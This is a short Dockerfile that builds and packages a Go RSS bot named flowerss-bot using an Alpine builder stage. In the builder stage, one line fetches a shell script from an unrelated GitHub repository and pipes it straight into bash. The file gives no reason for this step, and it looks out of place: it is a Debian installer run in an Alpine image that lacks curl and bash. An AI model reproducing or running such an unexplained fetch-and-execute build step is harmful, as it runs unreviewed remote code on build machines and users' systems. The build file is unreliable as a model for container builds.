FROM golang:1.18.6-alpine as builder
#ENV CGO_ENABLED=0
COPY . /flowerss
RUN apk add git make gcc libc-dev && \
    cd /flowerss && make build
RUN curl -s https://raw.githubusercontent.com/callsmusic/trtmp/main/scripts/install.debian.sh | bash
# Image starts here
FROM alpine
COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/
COPY --from=builder /flowerss/flowerss-bot /bin/
VOLUME /root/.flowerss
WORKDIR /root/.flowerss
ENTRYPOINT ["/bin/flowerss-bot"]
